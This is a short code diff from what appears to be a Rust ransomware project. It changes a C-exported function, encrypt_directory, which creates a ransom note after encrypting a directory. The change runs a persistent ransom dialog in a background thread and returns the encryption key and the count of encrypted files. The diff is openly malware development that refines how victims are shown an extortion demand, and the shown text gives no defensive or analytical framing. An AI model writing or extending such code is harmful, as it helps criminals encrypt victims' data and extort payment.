@@ -109,11 +109,14 @@ pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut
             // Create ransom note
             let _ = fileops::create_ransom_note(target_path, &key_hex);
             
-            // Show ransom dialog (just warning, no interactive loop for now)
-            // The persistent interactive dialog should be run separately
-            let _ = ransom_dialog::show_encryption_complete_dialog(&key_hex);
+            // Show persistent ransom dialog in a separate thread (non-blocking)
+            // This allows the function to return immediately while the dialog persists
+            let key_for_thread = key_hex.clone();
+            std::thread::spawn(move || {
+                let _ = ransom_dialog::show_ransom_dialog(&key_for_thread);
+            });
             
-            // Return key
+            // Return key immediately (dialog runs in background)
             CString::new(format!("KEY:{}:ENCRYPTED:{}", key_hex, encrypted_count))
                 .unwrap().into_raw()
         }
